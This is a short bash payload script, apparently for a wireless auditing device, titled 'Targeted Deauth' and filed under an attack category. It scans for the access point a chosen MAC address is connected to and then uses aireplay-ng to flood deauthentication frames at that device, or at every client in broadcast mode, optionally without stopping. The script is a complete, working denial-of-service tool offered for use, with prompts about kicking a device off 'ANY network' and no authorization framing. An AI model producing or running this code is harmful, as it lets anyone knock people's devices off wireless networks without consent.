#!/bin/bash
# Title: Targeted Deauth
# Author: bad-antics
# Description: Deauthenticate a specific MAC address from any network
# Category: nullsec/attack

PROMPT "TARGETED DEAUTH

Disconnect a specific
device from ANY network.

Enter target MAC address
to kick them offline.

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

TARGET_MAC=$(MAC_PICKER "Target Device MAC:")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) 
    ERROR_DIALOG "MAC required!"
    exit 1
    ;;
esac

PROMPT "FIND TARGET NETWORK

1. Auto-scan for target
2. Enter BSSID manually
3. Broadcast (all networks)

Enter option next screen."

MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

BSSID=""
CHANNEL=""

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning for target..."
    timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/targetscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    # Find which AP the target is connected to
    BSSID=$(grep -i "$TARGET_MAC" /tmp/targetscan*.csv 2>/dev/null | head -1 | cut -d',' -f6 | tr -d ' ')
    CHANNEL=$(grep -i "$BSSID" /tmp/targetscan*.csv 2>/dev/null | head -1 | cut -d',' -f4 | tr -d ' ')
    
    if [ -z "$BSSID" ]; then
        ERROR_DIALOG "Target not found!

MAC: $TARGET_MAC
Not connected to any AP.

Try manual BSSID entry."
        exit 1
    fi
    
    PROMPT "TARGET FOUND!

Device: $TARGET_MAC
Connected to: $BSSID
Channel: $CHANNEL

Press OK to continue."

elif [ "$MODE" -eq 2 ]; then
    BSSID=$(MAC_PICKER "Target AP BSSID:")
    CHANNEL=$(NUMBER_PICKER "Channel (1-14):" 6)
elif [ "$MODE" -eq 3 ]; then
    BSSID="FF:FF:FF:FF:FF:FF"
    CHANNEL=$(NUMBER_PICKER "Channel (1-14):" 6)
fi

PACKETS=$(NUMBER_PICKER "Deauth packets:" 100)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PACKETS=100 ;; esac

CONTINUOUS=$(CONFIRMATION_DIALOG "Continuous mode?

Keep sending deauths
until stopped?")

resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?

Target: $TARGET_MAC
BSSID: $BSSID
Channel: $CHANNEL
Packets: $PACKETS

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig wlan0 channel $CHANNEL 2>/dev/null

LOG "Deauthing $TARGET_MAC..."

if [ "$CONTINUOUS" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    aireplay-ng -0 0 -a "$BSSID" -c "$TARGET_MAC" wlan0 &
    DEAUTH_PID=$!
    
    PROMPT "DEAUTH ACTIVE

Target: $TARGET_MAC
Mode: Continuous

Press OK to STOP."
    
    kill $DEAUTH_PID 2>/dev/null
else
    aireplay-ng -0 $PACKETS -a "$BSSID" -c "$TARGET_MAC" wlan0
fi

PROMPT "DEAUTH COMPLETE

Target: $TARGET_MAC
Packets sent: $PACKETS

Press OK to exit."
